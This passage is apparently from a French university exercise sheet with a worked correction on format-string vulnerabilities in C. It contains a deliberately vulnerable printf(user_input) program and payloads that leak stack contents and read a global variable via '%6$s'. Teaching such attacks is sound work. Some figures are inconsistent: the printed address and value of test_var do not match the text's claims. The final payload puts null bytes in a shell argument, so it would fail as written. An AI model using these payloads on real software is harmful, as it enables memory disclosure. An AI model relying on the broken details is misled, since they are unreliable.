    printf("Usage: %s <text to print> <entier>\n", argv[0]);
    exit(0);
  }
  d=atoi(argv[2]);

  strcpy(texte, argv[1]);
  printf("La bonne facon d'afficher des entrees utilisateurs:\n");
  printf("%s", texte);
  printf("\nLa mauvaise facon d'afficher des entrees utilisateurs:\n");
  printf(texte);
  printf("\n");
  // Debug output
  printf("[*] test_var @ %p = %lu, %04x\n", &test_var, &test_var, test_var);
  printf("[*] adresse de d=%p, valeur de d=0x%016lx\n", &d, d);
  printf("[*] adresse de texte=%p\n", texte);
  exit(0);
}
\end{lstlisting}

\begin{enumerate}
\item Comprendre et tester le programme, puis appliquer ce que l'on a vu en cours pour afficher le contenu de la pile de \texttt{main} en choisissant bien l'argument du programme dans la ligne de commande.
\item Si l'argument du programme contient le format \texttt{"\%s"}, que va-t-il se passer ? Peut-on choisir l'adresse qui concerne \texttt{"\%s"} et l'appliquer pour lire la valeur de \texttt{test\_var} ?
\end{enumerate}

\begin{correction}
\textbf{Question 1 : Afficher le contenu de la pile}

\medskip

\textbf{Compréhension du programme :}

Le programme contient deux appels à \texttt{printf} avec l'entrée utilisateur :
\begin{itemize}
    \item \texttt{printf("\%s", texte)} : affichage \textbf{sûr}. La chaîne de format est fixe (\texttt{"\%s"}), l'entrée utilisateur est un argument.
    \item \texttt{printf(texte)} : affichage \textbf{dangereux}. L'entrée utilisateur EST la chaîne de format. Si elle contient des spécificateurs comme \texttt{\%x}, \texttt{\%lx}, \texttt{\%s}, \texttt{printf} ira lire des arguments supplémentaires qui n'existent pas, piochant dans les registres puis sur la pile.
\end{itemize}

\textbf{Test de base :}
\begin{lstlisting}[language=bash,numbers=none]
$ gcc -fno-stack-protector -no-pie -g exo4.c -o exo4
$ ./exo4 "Bonjour" 42
La bonne facon d'afficher des entrees utilisateurs:
Bonjour
La mauvaise facon d'afficher des entrees utilisateurs:
Bonjour
[*] test_var @ 0x404048 = 4210724, 00404064
[*] adresse de d=0x7fffffffdb98, valeur de d=0x000000000000002a
[*] adresse de texte=0x7fffffffdb90
\end{lstlisting}

Pas de différence visible, car l'entrée ne contient pas de spécificateur de format.

\textbf{Lecture de la pile avec \texttt{\%08x} :}

On injecte des spécificateurs \texttt{\%08x} (affichage hexadécimal sur 8 chiffres) :
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo4 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x" 42
La bonne facon d'afficher des entrees utilisateurs:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
La mauvaise facon d'afficher des entrees utilisateurs:
ffffe3a8.00000003.00000000.00000000.00404048.78383025.3830252e.30252e78
\end{lstlisting}

\textbf{Analyse :}
\begin{itemize}
    \item L'affichage \og{}bon\fg{} montre la chaîne telle quelle (les \texttt{\%08x} sont traités comme du texte).
    \item L'affichage \og{}mauvais\fg{} interprète chaque \texttt{\%08x} comme un format : \texttt{printf} lit les valeurs des registres (en x86-64, les arguments suivants sont passés via \texttt{rsi}, \texttt{rdx}, \texttt{rcx}, \texttt{r8}, \texttt{r9}), puis il lit des valeurs sur la pile.
    \item Les valeurs \texttt{78383025}, \texttt{3830252e}, etc. sont les codes ASCII de la chaîne de format elle-même (\texttt{\%08x.\%08x...}), car \texttt{texte} est une variable locale qui se trouve sur la pile.
\end{itemize}

On peut aussi utiliser \texttt{\%lx} pour afficher des mots de 8 octets (64 bits) :
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo4 "%016lx|%016lx|%016lx|%016lx|%016lx|%016lx|%016lx" 42
\end{lstlisting}

Cela permet de visualiser la pile mot par mot et de repérer les adresses, les valeurs des variables locales, les adresses de retour, etc.

\begin{pointcle}
L'appel \texttt{printf(texte)} où \texttt{texte} est contrôlé par l'utilisateur est une vulnérabilité de type \textit{format string}. L'attaquant peut utiliser des spécificateurs de format pour :
\begin{itemize}
    \item \texttt{\%x}, \texttt{\%lx} : lire des valeurs sur la pile (fuite de mémoire)
    \item \texttt{\%s} : lire une chaîne à une adresse arbitraire
    \item \texttt{\%n} : \textbf{écrire} en mémoire (nombre de caractères écrits)
\end{itemize}
\end{pointcle}

\bigskip

\textbf{Question 2 : Utilisation de \texttt{\%s} pour lire \texttt{test\_var}}

\medskip

\textbf{Que fait \texttt{\%s} ?}

Le spécificateur \texttt{\%s} attend un argument de type \texttt{char*} (un pointeur vers une chaîne). \texttt{printf} va lire la valeur suivante disponible (registre ou pile) et l'interpréter comme une \textbf{adresse mémoire}, puis afficher la chaîne de caractères à cette adresse jusqu'au premier octet nul (\texttt{\textbackslash 0}).

Si la valeur lue ne correspond pas à une adresse valide, le programme fait un \textit{segfault}.

\textbf{Test simple :}
\begin{lstlisting}[language=bash,numbers=none]
$ ./exo4 "%s" 42
La mauvaise facon d'afficher des entrees utilisateurs:
Segmentation fault (core dumped)
\end{lstlisting}

Le premier \og{}argument\fg{} que \texttt{printf} récupère pour \texttt{\%s} n'est pas une adresse valide, d'où le crash.

\textbf{Stratégie pour lire \texttt{test\_var} :}

On connaît l'adresse de \texttt{test\_var} grâce à la sortie de debug (par exemple \texttt{0x404048}). L'idée est de :
\begin{enumerate}
    \item Placer l'adresse de \texttt{test\_var} dans notre chaîne d'entrée \texttt{texte} (qui est sur la pile)
    \item Utiliser suffisamment de \texttt{\%x} ou \texttt{\%lx} pour \og{}consommer\fg{} les arguments jusqu'à atteindre l'endroit sur la pile où se trouve notre adresse
    \item Terminer par un \texttt{\%s} qui lira la chaîne à l'adresse que nous avons placée
\end{enumerate}

Concrètement, il faut d'abord déterminer à quel \og{}numéro d'argument\fg{} correspond le début de \texttt{texte} sur la pile. On peut le faire en plaçant un marqueur reconnaissable (comme \texttt{AAAA} = \texttt{0x41414141}) et en comptant les \texttt{\%x} nécessaires pour le voir apparaître :

\begin{lstlisting}[language=bash,numbers=none]
$ ./exo4 "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x" 42
La mauvaise facon d'afficher des entrees utilisateurs:
AAAAffffe3a8.00000003.00000000.00000000.00404048.41414141.78383025 ...
\end{lstlisting}

On voit \texttt{41414141} apparaître en 6\ieme{} position : cela signifie que le 6\ieme{} \og{}argument\fg{} de \texttt{printf} correspond au début de \texttt{texte} sur la pile.

On peut utiliser la notation directe \texttt{\%6\$s} (accès direct au 6\ieme{} argument avec le format \texttt{\%s}) pour lire la chaîne à l'adresse que l'on place au début de \texttt{texte}.

\textbf{Construction du payload :}

On place l'adresse de \texttt{test\_var} (\texttt{0x404048}) en début de chaîne, suivie de \texttt{\%6\$s} :

\begin{lstlisting}[language=bash,numbers=none]
$ ./exo4 $(python3 -c "
import sys
addr = b'\x48\x40\x40\x00\x00\x00\x00\x00'  # 0x404048 en little-endian
payload = addr + b'%6\$s'
sys.stdout.buffer.write(payload)
") 42
\end{lstlisting}

Le \texttt{\%6\$s} dit à \texttt{printf} : \og{}prends le 6\ieme{} argument (qui est le début de \texttt{texte}, donc les 8 premiers octets = notre adresse) et interprète-le comme un pointeur vers une chaîne\fg{}. \texttt{printf} va alors lire les octets à l'adresse \texttt{0x404048} (celle de \texttt{test\_var}) et les afficher comme une chaîne de caractères.

\begin{attention}
La valeur de \texttt{test\_var} est $100 \times 256^2 + 100 \times 256 + 100 = \texttt{0x00646464}$. En mémoire (little-endian), cela donne les octets \texttt{64 64 64 00}. Interprétés comme une chaîne, cela affiche \texttt{ddd} (code ASCII \texttt{0x64} = \texttt{'d'}) suivi d'un octet nul (fin de chaîne). On lira donc la chaîne \texttt{"ddd"}.
\end{attention}

\textbf{Variante avec \texttt{\%n\$x} :} on peut aussi utiliser \texttt{\%6\$x} ou \texttt{\%6\$lx} pour afficher directement la valeur à la position 6 en hexadécimal (sans l'interpréter comme un pointeur). Cela afficherait l'adresse elle-même (\texttt{0x404048}) et non le contenu pointé.

\begin{pointcle}
Les vulnérabilités de chaîne de format sont particulièrement dangereuses car elles permettent à la fois la \textbf{lecture} (\texttt{\%x}, \texttt{\%s}) et l'\textbf{écriture} (\texttt{\%n}) arbitraires en mémoire. La correction est simple : \textbf{toujours} passer l'entrée utilisateur comme argument et non comme format : \texttt{printf("\%s", input)} au lieu de \texttt{printf(input)}.
\end{pointcle}
\end{correction}

\end{exercice}


\end{document}
